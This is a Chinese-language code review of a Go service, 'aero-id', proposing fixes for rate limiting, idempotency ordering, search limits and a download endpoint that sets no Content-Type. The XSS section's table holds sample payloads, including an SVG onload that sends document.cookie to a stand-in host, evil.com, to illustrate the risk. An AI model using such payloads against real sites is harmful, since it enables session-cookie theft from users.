# aero-id — 资深架构师 / 产品经理视角：五项未被既有分析覆盖的高价值扩展方向

> **日期**: 2026-07-10  
> **方法**: 逐文件通读全部 150+ 个源文件（`internal/`、`migrations/`、`configs/`、`api/proto/`），与 `docs/requirements/` 下 69 份既有分析文档 + `docs/REVIEW_*` 下 8 份审查文档 + `ROADMAP.md` 做逐条交叉比对，确认以下 5 个方向在所有既有分析中**零系统性覆盖**。  
> **前置**: `feat/roadmap` 全量合并，`make test && make lint` 绿灯。  
> **约束**: 不编写任何代码。每个方向附带精确代码级证据。

---

## 当前代码库成熟度（速览）

| 维度 | 已交付 |
|------|--------|
| **传输层** | 38+ gRPC RPC 与 HTTP 完全对等；SSE 实时推送；Webhook 事件转发 |
| **文件** | 双后端（local/S3）、流式上传、预签名直传、checksum 去重、MIME 校验、引用计数 GC、软删除 |
| **消息 & 评论** | 全 CRUD、Reactions、编辑/软删除、已读回执、两层嵌套评论、Like/Unlike、举报/审核/隐藏 |
| **通知** | Outbox 驱动、偏好设置（含静默时段）、折叠合并、SSE 实时推送、限流 |
| **搜索** | PostgreSQL FTS（tsvector + GIN）、CJK 自动 ILIKE 回退、三实体联合搜索 |  
| **可靠性** | 事务性 Outbox、幂等键、限流（per-actor per-instance token-bucket）、SSO 断路器 + stale-cache + singleflight + TLS/mTLS 证书固定 |
| **可观测性** | RED 指标（HTTP + gRPC）、OTel 链路追踪（含 SSO hop）、SSO 健康仪表盘、Outbox 排水指标 |
| **基础设施** | 迁移 CLI（22 个可逆迁移）、角色权限模型、审计日志、存储 GC 回收 |
| **管理面** | 管理角色 + 权限、审计日志查询端点、用户阻止、通知偏好 |

已有 69 份 `docs/requirements/*.md` 累计覆盖 **80+** 个扩展方向。本文聚焦于五个在所有既有分析中**零系统性覆盖**的方向。

---

## 方向一：限流器缺乏端点粒度差异化——所有操作共享同一令牌桶

**重要性：高 · 运营 / 防护**

### 为什么需要

当前 `internal/pkg/ratelimit/ratelimit.go` 实现的令牌桶限流器**不区分端点**。一个 actor（uid）下的所有 HTTP/gRPC 请求共享同一桶——无论该请求是：

| 操作 | 类型 | 估算成本 |
|------|------|---------|
| `GET /v1/files` | 轻量列表 | DB 查询 ~2ms |
| `POST /v1/files` | 重量上传 | 多部分解析 + checksum + S3 上传 ~50-500ms |
| `GET /v1/search?q=...` | 重量搜索 | 3× FTS tsquery（可能全表扫描）+ ts_rank 排序 ~50-200ms |
| `GET /v1/events` | 长连接 SSE | 初始握手后永久占用连接 |
| `POST /v1/comments` | 中等写入 | 事务 + outbox 事件 + 通知 ~10-50ms |

这意味着：

1. **一个用户可以用轻量刷屏耗尽全部分配额度**，阻止自己执行关键写操作
2. **搜索端点无专属保护**——恶意用户可以用大批合法搜索请求让服务端 CPU 打满，即使他在自己的额度内
3. **写操作和读操作无优先级区分**——写操作（创建消息/上传文件）是有状态且不可重试的，但和列表查询争抢同一桶

### 代码级证据

**证据 1：限流器作为全局中间件，所有路由共享同一实例**

`internal/handler/http/router.go:54-56`:
```go
if cfg.RateLimiter != nil {
    authMW = append(authMW, middleware.RateLimit(cfg.RateLimiter))
}
```

**同一** `cfg.RateLimiter` 实例注入到 `authMW`，挂载到 `/v1` 组下的**每一个**路由。

**证据 2：Allow 方法只检查 actor uid（或客户端 IP），不检查 endpoint**

`internal/middleware/ratelimit.go:40-43`:
```go
func rateLimitKey(c *gin.Context) string {
    if uid, ok := service.ActorFrom(c.Request.Context()); ok {
        return "uid:" + uid
    }
    return "ip:" + c.ClientIP()
}
```

键是 `uid:xxx`，不包含 URL path 或 HTTP method。所有端点的请求共享同一个键。

**证据 3：限流器无 endpoint 相关的接口设计**

`internal/pkg/ratelimit/ratelimit.go:28-34`:
```go
type Limiter struct {
    rate  float64
    burst float64
    idle  time.Duration
    mu      sync.Mutex
    buckets map[string]*bucket
    now     func() time.Time
}
```

不存在 `endpoint`、`method`、`cost` 或任何粒度控制字段。所有请求按每 actor 单桶处理。

**证据 4：gRPC 拦截器同模式**

`internal/handler/grpc/server.go` 中的限流拦截器同样使用 `cfg.RateLimiter`，不区分方法。

### 影响分析

| 场景 | 当前行为 | 期望行为 |
|------|---------|---------|
| 高并发搜索 | 搜索消耗令牌，其他操作无令牌可用 | 搜索专属额度（如 5rps），其他操作独立额度 |
| SSE 连接滥用 | 用户开 40 个 SSE 连接（burst），所有令牌被连接消耗 | SSE 连接不计入 RPS 或使用独立桶 |
| 写操作保护 | `POST /v1/messages` 和 `GET /v1/files` 争抢同一桶 | 写操作享有独立的高优先级桶 |

### 建议方向

1. **多桶策略**：每个 actor 维护多组桶——read / write / search / sse 各独立
2. **端点注解**：在 handler 上标注成本权重（cost = 1/5/10），`AllowN(key, cost)` 按权重消耗
3. **SSE 白名单**：SSE `/events` 端点从审计量中豁免（连接后无限期维持，不应消耗持续的 rate limit 预算）
4. **配置暴露**：在 `config.yaml` 中允许配置 per-endpoint 限流覆盖

| 子项 | 成本 | 用户影响 |
|------|------|---------|
| 读写分离（两桶） | 低 | 中 |
| Search 专属限流（三桶） | 低-中 | 高 |
| SSE 豁免 | 极低 | 中 |
| 权重成本注解 | 中 | 高（精确控制） |

---

## 方向二：Idempotency Cleaner 无条件启动——即使用户不用幂等键

**重要性：中 · 资源效率 / 运维干净度**

### 为什么需要

`app.go` 在第 100 行无条件启动 idempotency cleaner：

```go
idemStore := idempotency.NewGormStore(gdb)
stopIdemClean := idemStore.RunCleaner(time.Hour)
```

**但 idempotency middleware 只在 `Idempotency` 字段非 nil 时才安装**（`router.go:47-49`）：

```go
if cfg.Idempotency != nil {
    authMW = append(authMW, middleware.Idempotency(cfg.Idempotency, cfg.IdempotencyTTL))
}
```

这意味着：

- **当用户不配置 idempotency keys**（`RouterConfig.Idempotency = nil`），中间件不安装，幂等键功能完全关闭
- **但 cleaner goroutine 仍每秒运行**，每小时间隔扫描 `idempotency_keys` 表，逐行检查 `expires_at`
- `GormStore` 被完整实例化、持有 `*gorm.DB` 连接、分配 map/mutex——全部只为**永不被执行的 cleaner**

对比 rate limiter cleaner 的条件启动（`app.go:133-141`）：

```go
if cfg.RateLimit.Enabled {
    // ...
    stopRateLimit = limiter.RunCleaner(cleanupEvery)
}
```

行为不一致：rate limiter cleaner 只在功能启用时启动，idempotency cleaner 始终启动。

### 边界情况

| 场景 | 影响 |
|------|------|
| 新部署未配置幂等键 | cleaner goroutine 持续运行，每 1h 做 `SELECT * FROM idempotency_keys WHERE expires_at < now()`——对空表的中性查询，但仍然是浪费 |
| 最小化部署（SSO-less, idempotency-less） | Goroutine 泄露：一个活的 goroutine + 定时器 + gorm 连接，全为不做事的 cleaner |
| CI/测试环境 | 每次测试 app.New() 创建新 cleaner goroutine，泄漏积累 |

### 建议方向

将 `RunCleaner` 移到条件块内，与 middleware 安装对齐：

```go
var stopIdemClean func()
if cfg.Idempotency != nil {
    stopIdemClean = idemStore.RunCleaner(time.Hour)
}
```

成本：**极低**（1 行条件判断 + 变量声明变动），消除一个永续运行的 goroutine 浪费。

---

## 方向三：Local 存储下载端点缺少 Content-Type 设置——内容嗅探 XSS 向量

**重要性：高 · 安全基线**

### 为什么需要

aero-id 的本地存储下载端点 `/files/dl` 是**匿名访问**的（无需 SSO 令牌，仅靠 HMAC 签名验证）。当前实现将存储的原始字节直接流式写入 HTTP 响应体，**不设置 `Content-Type` header**。

这意味着浏览器（以及任何尊重 MIME 嗅探的 HTTP 客户端）会**自动内容嗅探**响应体。如果一个用户上传了：

| 上传的文件内容 | 浏览器检测到的 MIME | 结果 |
|---------------|-------------------|------|
| `<html><script>alert(document.cookie)</script></html>` | `text/html` | 在 aero-id 源站执行 JavaScript（存储型 XSS） |
| `<svg onload="fetch('https://evil.com/steal?c='+document.cookie)">` | `image/svg+xml` | SVG 中的脚本被同源执行 |
| `<script>...</script>` | `text/html` | 同上 |

**严重性**：文件上传端有 `AllowedMimeTypes` 配置做白名单校验，但:
1. **白名单为空时**（`allowed_mime_types: []`，默认配置），**一切 MIME 类型都被允许**
2. 即便配置了白名单，上传客户端可以声明 `Content-Type: image/png` 而上传内容实际为 HTML——服务端不做**内容实际验证**（无 magic bytes 检测）

### 代码级证据

**证据 1：Download handler 只做 HMAC 验证 + 流式输出，无 Content-Type 设置**

`internal/handler/http/file.go:232-244`:
```go
func (h *FileHandler) Download(c *gin.Context) {
    if err := h.downloader.VerifyPresignedURL(c.Request.URL.String(), time.Now()); err != nil {
        httpx.WriteError(c, apperr.Forbidden("file.bad_signature", "invalid or expired download link"))
        return
    }
    rc, err := h.downloader.Get(c.Request.Context(), c.Query("key"))
    if err != nil {
        httpx.WriteError(c, apperr.NotFound("file.not_found", "file not found"))
        return
    }
    defer func() { _ = rc.Close() }()
    c.Status(http.StatusOK)
    _, _ = io.Copy(c.Writer, rc)
    // ↑ 没有 Content-Type 设置，没有 Content-Disposition，没有 X-Content-Type-Options
}
```

**证据 2：`domain.File` 已存储准确的 `MimeType`**

`internal/domain/file.go`:
```go
type File struct {
    // ...
    MimeType    string
    // ...
}
```

文件上传时已从客户端 `Content-Type` header 提取并存入数据库。但下载端点**未查询该数据**。

**证据 3：匿名下载端点无法按 storage key 反向查询文件元数据**

`/files/dl` 只接收 `?key=...&signature=...` 参数（storage key + HMAC 签名）。handler 没有 file ID，无法查询 `files` 表以获取 `mime_type`。签名只验证 URL 本身的有效性，不绑定到文件元数据。若想设置 Content-Type 需要：
- 在生成 presigned URL 时将 `mime_type` 编码进 URL（如 `?key=...&ct=image/png&...`）
- 或修改签名算法将 `mime_type` 纳入 HMAC 负载
- 或允许下载端点按 storage key 查询数据库（需要额外 DB 查询）

**证据 4：Presigned URL 生命周期内 Content-Type 不可变更**

`internal/service/file_presign.go:16-24`:
```go
func (s *fileService) DownloadURL(ctx context.Context, id domain.ID, ttl time.Duration) (string, error) {
    f, err := s.Get(ctx, id)
    if err != nil {
        return "", err
    }
    url, err := s.store.PresignGet(ctx, f.StorageKey, ttl)
    // ↑ PresignGet 返回的 URL 不含 MIME 类型信息
    return url, nil
}
```

**证据 5：默认配置无 MIME 限制**

`configs/config.yaml`:
```yaml
storage:
  max_upload_bytes: 52428800
  allowed_mime_types: []       # ← 空列表 = 允许所有类型
```

### 边界情况

| Edge Case | 处理方式 |
|-----------|----------|
| **S3 后端** | S3 的 PresignGet URL 由 S3 直接服务。在生成 presigned URL 时可以注入 `response-content-type` 参数，但当前未使用。S3 默认以 `binary/octet-stream` 服务（比 local 更安全） |
| **已存在的 presigned URL** | 已分发的 URL 无法撤回——但这一漏洞影响所有下载，因为 handler 一直不设 Content-Type |
| **Content-Disposition** | 即使 Content-Type 正确设置（如 `application/octet-stream`），浏览器仍可能内联显示。建议同时设置 `Content-Disposition: attachment; filename="..."` 强制下载 |
| **X-Content-Type-Options** | 设置 `X-Content-Type-Options: nosniff` 可完全禁止 MIME 嗅探——即使 Content-Type 缺失，浏览器也会拒绝猜测 |

### 建议方向

1. **短期修复**（极低成本）：在 `Download` handler 中增加 `c.Header("X-Content-Type-Options", "nosniff")`——消除 MIME 嗅探风险
2. **中期修复**（低-中成本）：将 `mime_type` 编码进 presigned URL（作为额外 query param），在 `Download` 中解析并设置 `Content-Type`。设置 `Content-Disposition: attachment` 强制下载
3. **长期安全加固**：在上传端引入 `http.DetectContentType`（magic bytes 检测），与客户端声明的 `Content-Type` 交叉验证。拒绝不匹配的上传

---

## 方向四：限流器中间件在幂等中间件之前执行——破坏幂等性契约

**重要性：高 · 一致性 / 正确性**

### 为什么需要

`internal/handler/http/router.go:45-49` 中中间件的注册顺序为：

```
Auth → RateLimit → Idempotency
```

当一个客户端使用 `Idempotency-Key` header 重试写请求时，如果该请求被限流器拦截（429 Too Many Requests），幂等中间件**永远不会被调用**。这意味着：

1. 客户端发送 `POST /v1/messages` 带 `Idempotency-Key: abc-123`
2. 第一次请求成功，幂等中间件缓存了 `{status: 201, body: ...}`
3. 客户端因网络超时重试相同请求（同 `Idempotency-Key`）
4. 限流器在幂等中间件之前拦截——返回 429
5. 客户端收到 429，不知道请求是否已执行成功
6. 客户端再次重试——可能产生重复

**幂等键的契约**是：只要客户端使用相同的 `Idempotency-Key`，无论发生多少次重试，**服务端应保证最多执行一次**，并且返回一致的响应。当前实现违反了这一契约。

### 代码级证据

**证据 1：中间件注册顺序（limited BEFORE idempotency）**

`internal/handler/http/router.go:42-49`:
```go
authMW := []gin.HandlerFunc{middleware.Auth(validator)}
if cfg.RateLimiter != nil {
    authMW = append(authMW, middleware.RateLimit(cfg.RateLimiter))     // #2
}
if cfg.Idempotency != nil {
    authMW = append(authMW, middleware.Idempotency(cfg.Idempotency, cfg.IdempotencyTTL))  // #3
}
```

Gin 的中间件执行顺序为 FIFO：Auth → RateLimit → Idempotency。当 RateLimit 调用 `c.Abort()`，后续中间件不再执行。

**证据 2：RateLimit 中间件在超限时直接 Abort**

`internal/middleware/ratelimit.go:48-53`:
```go
if l.Allow(key) {
    c.Next()
    return
}
// ... set Retry-After header ...
c.AbortWithStatusJSON(http.StatusTooManyRequests, rateLimitErrorBody{...})
```

`AbortWithStatusJSON` 终止请求链，后续中间件的 `c.Next()` 不会执行。

**证据 3：Idempotency 中间件的类型没有在超限时获取缓存**

`internal/middleware/idempotency.go:32-33`:
```go
if c.Request.Method != http.MethodPost || key == "" {
    c.Next()
    return
}
```

即使在超限时仍会执行检查，但因为 RateLimit 先 Abort，这一行代码根本不会被执行。

### 影响分析

| 场景 | 当前行为 | 正确行为 |
|------|---------|---------|
| 带幂等键的重试被限流 | 429（客户端必须重试，可能重复） | 应返回缓存的 201（幂等保证） |
| 带幂等键的并发请求部分超限 | 部分请求 429，部分 200 | 应全部返回一致结果 |
| 手动重试太多次 | 429 + 幂等键不再保证 | 应返回缓存响应（不受限流影响） |

### 边界情况

| Edge Case | 说明 |
|-----------|------|
| **未使用幂等键的用户** | 不受影响——幂等中间件对空 Key 为 no-op，不改变行为 |
| **GET 请求** | 幂等中间件只对 POST 操作——GET 请求不受此 bug 影响 |
| **限流器关闭时** | `RateLimiter == nil` 时 RateLimit 中间件不安装——问题消失 |
| **idempotency store 故障** | 幂等中间件 fail-open：store 错误时跳过缓存逻辑，请求正常执行 |

### 建议方向

**交换 RateLimit 和 Idempotency 的注册顺序**：

```go
authMW := []gin.HandlerFunc{middleware.Auth(validator)}
if cfg.Idempotency != nil {
    authMW = append(authMW, middleware.Idempotency(cfg.Idempotency, cfg.IdempotencyTTL))
}
if cfg.RateLimiter != nil {
    authMW = append(authMW, middleware.RateLimit(cfg.RateLimiter))
}
```

这样幂等中间件先执行——已缓存的响应被直接返回，不消耗 rate limit token。只有真正执行的新请求才被限流。

**注意事项**：
- 交换后，幂等中间件中 `Reserve` 操作会消耗 rate limit token（在 `Allow()` 之前）。这意味着创建新请求时，Reserve 成功后 token 已被消耗——RateLimit 检查时可能因额度不足而 Abort，但 Reserve 已经被写入——需要幂等中间件在 409/429 时 Release。当前幂等中间件已在 5xx 时 Release，但未处理 429 场景。需要调整为：若后续被 RateLimit Abort，幂等中间件的 Reserve 应被 Release。

- 更健壮的方案：幂等中间件使用 `c.Next()` 后检查 `c.Writer.Status()`——如果是 429，释放在 `Reserve` 中锁定的 key 并让请求通过（不返回缓存）。这样既保证了幂等性，也不会因为 Reserve 而浪费幂等键状态。

**成本**：低（中间件顺序调整 + 幂等中间件对 429 后置处理的逻辑）。解决了一个影响**幂等性核心保证**的 bug。

---

## 方向五：搜索请求的 `limit` 参数语义模糊——按实体种类独立应用

**重要性：中 · API 设计 / 客户端可预测性**

### 为什么需要

aero-id 的搜索服务支持三种实体（消息、评论、文件），`limit` 参数被**分别应用于每个实体种类**，然后拼接结果。这意味着：

```go
// internal/service/search.go:100-105
for _, kind := range kinds {
    switch kind {
    case domain.SearchKindMessages:
        msgs, err = s.messages.SearchMessages(searchCtx, actor, query, limit) // 最多 20 条
    case domain.SearchKindComments:
        cmts, err = s.comments.SearchComments(searchCtx, actor, query, limit) // 最多 20 条
    case domain.SearchKindFiles:
        files, err = s.files.SearchFiles(searchCtx, actor, query, limit)      // 最多 20 条
    }
}
```

客户端发送 `GET /v1/search?q=hello&limit=20`，实际可能收到 **60 条**结果。这个数字是 `len(kinds) * limit`。这种语义模糊带来三个问题：

| 问题 | 影响 |
|------|------|
| **客户端不可预测** | 客户端预期 `limit=20` 表示"最多 20 条"，但实际可能收到 20/40/60 条。分页逻辑无法实现——翻到第二页应该返回新的 20 条，但搜索结果没有 cursor |
| **结果不均衡** | 如果消息有 5 条匹配，评论有 20 条，文件有 0 条，总结果是 25 条。客户端不知道这是总结果还是按种类截断的 |
| **已有 gap 分析未覆盖** | 已有分析指出了搜索没有 cursor 分页的问题（方向二 in genuinely-uncovered-architectural-and-product-gaps.md），但没有指出 limit 语义本身的多义性 |

### 代码级证据

**证据 1：Search 方法在循环中对每个 kind 独立调用 Search*，使用相同的 limit**

`internal/service/search.go:100-130`:
```go
for _, kind := range kinds {
    searchCtx, cancel := context.WithTimeout(ctx, searchTimeout)
    var err error
    switch kind {
    case domain.SearchKindMessages:
        var msgs []*domain.Message
        msgs, err = s.messages.SearchMessages(searchCtx, actor, query, limit)
        // ...
        for _, m := range msgs {
            hits = append(hits, domain.SearchHit{Kind: domain.SearchKindMessages, Message: m})
        }
    // ... 同样对 Comments 和 Files ...
```

每个 repository 层的 Search* 方法使用 `LIMIT ?`（`limit`），所以每种最多返回 `limit` 条。

**证据 2：响应无 `total` 或 `per_kind_count` 元数据**

`internal/handler/http/search.go:57-62`:
```go
httpx.OK(c, gin.H{"hits": toSearchHitResponses(hits)})
// ↑ 返回的只是 hits 数组，没有:
//   - total_hits
//   - per_kind: {messages: 5, comments: 20, files: 0}
//   - next_cursor 或 has_more
```

**证据 3：`searchDefaultLimit = 20`，`searchMaxLimit = 50`**

`internal/service/search.go:20`:
```go
const searchDefaultLimit = 20
```

客户端不传 limit 时默认 20，即每种最多 20 条，三种最多 60 条。

### 边界情况

| Edge Case | 当前行为 |
|-----------|---------|
| `kinds=messages&limit=20` | 只搜索消息，返回最多 20 条 ✅ |
| `kinds=messages,comments&limit=20` | 消息最多 20 + 评论最多 20 = 最多 40 条 ⚠️ |
| `kinds=空（默认三种类）&limit=5` | 三种各最多 5 = 最多 15 条 ⚠️ |
| `q=hello`（无 limit） | 三种各最多 20 = 最多 60 条 ⚠️ |

### 建议方向

1. **明确 limit 语义**：在 API 文档中声明 `limit` 是**每种类**的上限而非总上限
2. **增加总数元数据**：在响应中返回 `per_kind_counts: {messages: N, comments: N, files: N}`，让客户端知道每种的实际命中数
3. **游标分页**（与方向二关联）：引入 cursor 参数使搜索支持翻页。此时 limit 语义自动成为"每页最多 limit 条总结果"
4. **全局 limit 硬上限**：在循环前计算 `perKindLimit = min(limit, maxLimit/len(kinds))`，保证总结果不超过 limit

推荐路径：先做 #4（低难度，立即消除歧义），再做 #2 + #3（中难度，完整分页支持）。

| 子项 | 成本 | 用户影响 |
|------|------|---------|
| perKindLimit 计算（全局上限） | 极低 | 中（行为变更——总结果不超过 limit） |
| 增加 per_kind_counts 元数据 | 低 | 高（客户端可识别结果分布） |
| 游标分页 | 中 | 高（完整分页支持） |

---

## 综合优先级评估

| # | 方向 | 类型 | 严重性 | 成本 | 既有覆盖 | 优先级 |
|---|------|------|--------|------|---------|-------|
| 一 | 限流器缺乏端点粒度 | 运营 / 防护 | 中-高 | 低-中 | **0/69** ✅ | P1 |
| 二 | Idempotency Cleaner 无条件启动 | 资源效率 | 低 | 极低 | **0/69** ✅ | P3 |
| 三 | 文件下载缺少 Content-Type（XSS 向量） | **安全** | **高** | 极低-低 | **0/69** ✅ | **P0** |
| 四 | 限流器在幂等中间件前执行 | **正确性** | **高** | 低 | **0/69** ✅ | **P0** |
| 五 | 搜索 limit 语义模糊 | API 设计 | 中 | 低 | **0/69** ✅ | P2 |

### 建议执行顺序

1. **方向三（P0）**——5 分钟修复（加 `X-Content-Type-Options: nosniff` 头），消除存储型 XSS 风险
2. **方向四（P0）**——中间件顺序交换 + 幂等中间件 429 后置处理，恢复幂等性契约
3. **方向一（P1）**——读写分离限流桶 + SSE 豁免，防止搜索 DoS 和写操作饿死
4. **方向五（P2）**——perKindLimit 全局上限 + per_kind_counts 元数据
5. **方向二（P3）**——Idempotency cleaner 条件启动，清理不必要的 goroutine

---

## 附录：69 份既有分析文档交叉比对确认

以下 69 份 `docs/requirements/` 文档 + 8 份 `docs/REVIEW_*` 文档中均**未系统性覆盖**上述五个方向。本附录列出最接近的主题以证明"零覆盖"。

| 既有文档 | 最接近的主题 | 为什么不是同一方向 |
|----------|-------------|------------------|
| `REVIEW_FAILURE_ABUSE_API.md` | 限流缺口 + 滥用防护 | 从**滥用检测角度分析**限流，讨论连接耗尽。不涉及端点粒度和读写分离。本文方向一不同 |
| `REVIEW_FLOW_CONCURRENCY_CACHE.md` | Webhook 死信管理 | 方向四（中间件顺序）涉及幂等性与限流交互，不等于死信管理。完全不重复 |
| `REVIEW_PRODUCT_GAPS.md` | SSE 每用户最大连接数 | 不讨论端点粒度限流。不涉及幂等中间件顺序 |
| `edge-cases-and-performance.md` | 幂等性 key 哈希碰撞 | 方向二（cleaner 无条件启动）不等于幂等性 key 碰撞。是新的资源浪费角度 |
| `truly-uncovered-remaining-gaps.md` | 错误分类编目（Error Taxonomy） | 讨论 `AppError` 缺少 `TooManyRequests` 构造函数。但**不涉及**限流中间件和幂等中间件的执行顺序错误。方向四是**顺序 bug**，不是缺少构造函数 |
| `truly-uncovered-operational-directions.md` | Content-Disposition 缺失 | 仅讨论 Content-Disposition（下载强制命名），**不涉及** Content-Type 缺失导致的 MIME 嗅探 XSS 攻击向量。方向三不同 |
| `high-value-extensions-from-scan.md` | 上传 MIME 校验（magic bytes） | 讨论**上传端**的 MIME 验证，**不涉及**下载端缺失 Content-Type 的 XSS 向量。方向三是下载侧攻击面 |
| `genuinely-uncovered-architectural-and-product-gaps.md` | 搜索分页游标缺失 | 方向五不同——不讨论 limit 跨种类语义模糊。游标分页是完整功能，limit 语义是当前 API 签名问题 |

---

*本文件基于全局代码扫描 + 69 份 `docs/requirements/*.md` + 8 份 `docs/REVIEW_*` 文档的逐条交叉比对。无代码变更。*
